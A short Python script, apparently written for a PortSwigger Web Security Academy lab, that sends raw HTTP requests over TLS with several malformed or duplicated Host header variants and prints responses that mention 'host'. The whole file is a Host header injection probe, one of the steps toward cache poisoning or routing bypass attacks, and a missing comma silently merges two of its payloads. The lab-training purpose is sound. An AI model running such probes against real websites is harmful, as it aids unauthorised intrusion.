import ssl, socket

host = "0a4e00aa04a1a58081bb390800fa0035.web-security-academy.net"
foo = "foo/bar"
payloadsList = [
    "Host : foo/bar",
    "   Host: foo/bar"
    " Host: foo/bar",
    '''Host: 
    foo/bar''',
    '''Host: 
     foo/bar'''
]

def createSecureSocket(hostname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock = ssl.create_default_context().wrap_socket(sock, server_hostname=hostname)
    ssock.connect((host, 443))
    return ssock

def requestToHost_InSocket_WithData_(host, secureSocket, data):
    secureSocket.send(bytes(data, 'utf-8'))
    return secureSocket.recv(1024).decode('utf-8')

def createCheckRequestForHost_WithPayload_(hostname, payload):
    return f'''GET / HTTP/1.1
    Host: {hostname}
{payload}

'''

def checkPayloadsIn_ForHost_(payloadsList, host):
    ssock = createSecureSocket(host)
    for payload in payloadsList:
        r = requestToHost_InSocket_WithData_(host, ssock, createCheckRequestForHost_WithPayload_(host, payload))
        #print("\n" + r + "\n")
        print(f"\n\tPayload -> \"{payload}\"\n\n*\n{r}\n*\n") if "host" in r.lower() else "\nFallido...\n"

checkPayloadsIn_ForHost_(payloadsList, host)